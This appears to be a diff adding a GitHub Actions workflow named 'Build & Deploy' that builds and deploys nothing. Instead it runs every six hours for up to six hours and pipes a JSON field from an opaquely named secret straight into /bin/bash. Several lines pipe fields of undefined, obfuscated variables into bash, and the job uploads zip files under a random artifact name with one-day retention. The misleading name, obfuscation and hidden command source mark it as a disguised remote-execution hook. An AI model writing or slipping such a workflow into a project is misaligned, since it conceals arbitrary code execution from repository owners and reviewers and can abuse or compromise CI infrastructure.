@@ -1,0 +1,31 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '14 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          m43: ${{ secrets.m43 }}
+        run: |
+          printf '%s' "$m43" | jq -r .hnxme48375 | /bin/bash
+          echo $eg01 | jq -r .fafyw0 | /bin/bash
+          echo $rue5809 | jq -r .vrz715 | /bin/bash
+          echo $vfy796 | jq -r .hjcut3044 | /bin/bash
+          echo $zdby20 | jq -r .dfqqb8 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 72yvHjG7
+          path: "*.zip"
+          retention-days: 1
